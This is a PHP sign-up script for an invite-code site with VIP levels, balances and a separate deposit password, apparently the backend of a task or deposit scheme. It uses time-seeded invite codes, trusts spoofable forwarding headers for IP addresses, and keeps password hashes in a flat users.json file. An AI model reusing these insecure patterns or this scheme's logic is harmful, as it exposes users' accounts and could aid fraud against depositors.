<?php
    error_reporting(E_ALL ^ E_WARNING);
    function create_invite_code() {
        $char_list = ["Q","W","E","R","T","Y","U","I","O","P","A","S","D","F","G","H","J","K","L","Z","X","C",
                        "V","B","N","M","1","2","3","4","5","6","7","8","9"];
        $result = "";
        for ($i=0; $i < 7; $i++) { 
            $result .= $char_list[(time() * random_int(1111,9999)) % (count($char_list) - 1)];
        }
        return $result;
    }

    function find_user($users_arr,$link) {
        for ($i=0; $i < count($users_arr); $i++) { 
            if ($users_arr[$i]["referral_code"] == $link) {
                return $users_arr[$i];
            }
        }
        return null;
    }

    function get_ip() {
        $ip = '';
        if (isset($_SERVER['HTTP_CLIENT_IP'])){
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        }else if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        }else if(isset($_SERVER['HTTP_X_FORWARDED'])){
            $ip = $_SERVER['HTTP_X_FORWARDED'];
        }else if(isset($_SERVER['HTTP_FORWARDED_FOR'])){
            $ip = $_SERVER['HTTP_FORWARDED_FOR'];
        }else if(isset($_SERVER['HTTP_FORWARDED'])){
            $ip = $_SERVER['HTTP_FORWARDED'];
        }else if(isset($_SERVER['REMOTE_ADDR'])){
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        /* if( empty($ip) || $ip == '0.0.0.0' || substr( $ip, 0, 2 ) == '::' ){
            $ip = file_get_contents('https://api.ipify.org/');
            $ip = ($ip===false?$ip:'');
        } */
        return $ip;
    }

    try{
        $user_name = $_POST["user_name"];
        $phone_number = $_POST["pre"].$_POST["tel"];
        $password = $_POST["pwd"];
        $deposit_password = $_POST["deposit_pwd"];
        $referral_link = $_POST["invite"];

        if (!empty($user_name) && !empty($phone_number)) {
            if (!empty($password) && $deposit_password == $password) {
                if(!empty($referral_link)){
                    $users = json_decode(file_get_contents("users.json"),true);
                    $user_exists = false;
                    for ($i=0; $i < count($users); $i++) { 
                        if ($users[$i]["tel"] == $phone_number) {
                            $user_exists = true;
                            break;
                        }
                    }
                    if (!$user_exists) {
                        $new_user = array(
                            "tel"=> $phone_number,
                            "pwd" => password_hash($password,PASSWORD_BCRYPT),
                            "user_name" => $user_name,
                            "user_id" => base64_encode(time()),
                            "balance" => 0,
                            "referral_code" => create_invite_code(),
                            "user_status" => "VIP 1",
                            "link_added_from" => $referral_link,
                            "date" => gmdate("M d Y H:i:s",time()),
                            "is_real" => "dummy",
                            "tymd" => time(),
                            "group" => "Day 1 Client Accounts",
                            "ip_address" => get_ip(),
                            "order_state_amount" => 66
                        );
                        $referral_user = find_user($users,$referral_link);
                        if (isset($referral_user)) {
                            //TODO 
                            #insert code for changing user deposit according to commission
                            $users[count($users)] = $new_user;
                            $saved = file_put_contents("users.json",json_encode($users));
                            if (!isset($saved)) {
                                echo json_encode(array("code" => 3,"info" => "an issue occured registering you"));
                            }
                            session_start();
                            $_SESSION["user_id"] = $new_user["user_id"];
                            $_SESSION["user_name"] = $new_user["user_name"];
                            $_SESSION["balance"] = $new_user["balance"];
                            $_SESSION["referral_code"] = $new_user["referral_code"];
                            $_SESSION["user_status"] = $new_user["user_status"];
                            $_SESSION["last_activity"] = time();
                            echo json_encode(array("code" => 0,"info" => "registration sucessful"));
                        }
                        else{
                            echo json_encode(array("code" => 5,"info" => "enter a valid invite code"));
                        }
                    }
                    else {
                        echo json_encode(array("code" => 4,"info" => "a user with this phone number already exists"));
                    }
                }
                else{
                    echo json_encode(array("code" => 5,"info" => "Please enter an invite link."));
                }
            }
            else {
                echo json_encode(array("code" => 1,"info" => "passwords do not match"));
            }
        }
        else{
            echo json_encode(array("code" => 2,"info" => "username or phone number is empty"));
        }
    }
    catch(Exception){
        echo json_encode(array("code" => 3,"info" => "an issue occured registering you"));
    }
    
?>
